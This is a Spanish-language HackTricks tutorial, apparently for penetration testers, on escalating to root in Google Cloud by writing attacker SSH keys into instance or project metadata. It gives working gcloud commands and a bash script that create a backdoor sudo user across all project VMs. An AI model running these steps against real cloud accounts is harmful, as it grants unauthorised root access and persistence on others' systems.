# GCP - Añadir Metadatos SSH Personalizados

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Modificando los metadatos <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Si puedes **modificar los metadatos de la instancia**, hay numerosas formas de escalar privilegios localmente. Hay algunos escenarios que pueden llevar a una cuenta de servicio con este permiso:

_**Cuenta de servicio predeterminada**_\
Si el **alcance** de acceso de la cuenta de servicio está configurado para **acceso completo** o al menos permite explícitamente el **acceso a la API de compute**, entonces esta configuración es **vulnerable** a la escalada. El **alcance** **predeterminado** **no** es **vulnerable**.

_**Cuenta de servicio personalizada**_\
Al usar una cuenta de servicio personalizada, **una** de los siguientes permisos IAM **es** **necesario** para escalar privilegios:

* `compute.instances.setMetadata` (para afectar a una sola instancia)
* `compute.projects.setCommonInstanceMetadata` (para afectar a todas las instancias en el proyecto)

Aunque Google [recomienda](https://cloud.google.com/compute/docs/access/service-accounts#associating\_a\_service\_account\_to\_an\_instance) no usar alcances de acceso para cuentas de servicio personalizadas, todavía es posible hacerlo. Necesitarás uno de los siguientes **alcances de acceso**:

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platform`

### **Añadir claves SSH a metadatos personalizados**

Los **sistemas Linux** en GCP suelen ejecutar scripts del [Entorno de Invitado Linux de Python para Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Uno de estos es el [daemon de cuentas](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), que **consulta periódicamente** el punto final de metadatos de la instancia para **cambios en las claves públicas SSH autorizadas**.

**Si se encuentra una nueva clave pública**, se procesará y **se añadirá a la máquina local**. Dependiendo del formato de la clave, se añadirá al archivo `~/.ssh/authorized_keys` de un **usuario existente o creará un nuevo usuario con derechos de `sudo`**.

Por lo tanto, si puedes **modificar los metadatos personalizados de la instancia** con tu cuenta de servicio, puedes **escalar** a root en el sistema local **obteniendo derechos SSH** en una cuenta privilegiada. Si puedes modificar **metadatos personalizados del proyecto**, puedes **escalar** a root en **cualquier sistema del proyecto GCP actual** que esté ejecutando el daemon de cuentas.

### **Añadir clave SSH a usuario privilegiado existente**

Empecemos por añadir nuestra propia clave a una cuenta existente, ya que probablemente eso generará menos ruido.

**Verifica la instancia para claves SSH existentes**. Elige uno de estos usuarios, ya que es probable que tengan derechos de sudo.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
Busca una sección como la siguiente:
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
Tenga en cuenta el **formato ligeramente inusual** de las claves públicas: el **nombre de usuario** se indica al **principio** (seguido de dos puntos) y luego nuevamente al **final**. Necesitaremos seguir este formato. A diferencia del funcionamiento normal de las claves SSH, ¡el nombre de usuario importa absolutamente!

**Guarde las líneas con nombres de usuario y claves en un nuevo archivo de texto** llamado `meta.txt`.

Supongamos que estamos apuntando al usuario `alice` mencionado anteriormente. **Generaremos una nueva clave** para nosotros mismos de esta manera:
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
Agregue su nueva clave pública al archivo `meta.txt` imitando el formato:
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
Ahora, puedes **reescribir los metadatos de la clave SSH** para tu instancia con el siguiente comando:
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
Ahora puedes **acceder a un shell en el contexto de `alice`** de la siguiente manera:
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **Crear un nuevo usuario privilegiado y añadir una clave SSH**

¿No se encontraron claves existentes siguiendo los pasos anteriores? ¿No hay nadie más interesante en `/etc/passwd` para atacar?

Puedes **seguir el mismo proceso** que arriba, pero simplemente **inventar un nuevo nombre de usuario**. Este usuario se creará automáticamente y se le otorgarán derechos para `sudo`. El proceso automatizado se vería así:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Claves SSH a nivel de proyecto <a href="#sshing-around" id="sshing-around"></a>

Siguiendo los detalles mencionados en la sección anterior, puedes intentar comprometer más VMs.

Podemos expandir un poco sobre esto [**aplicando claves SSH a nivel de proyecto**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide), otorgándote permiso para **conectarte por SSH a una cuenta privilegiada** en cualquier instancia que no haya elegido explícitamente la opción "Bloquear claves SSH de todo el proyecto".
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
Si te sientes realmente audaz, también puedes simplemente escribir `gcloud compute ssh [INSTANCE]` para usar tu nombre de usuario actual en otras máquinas.

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
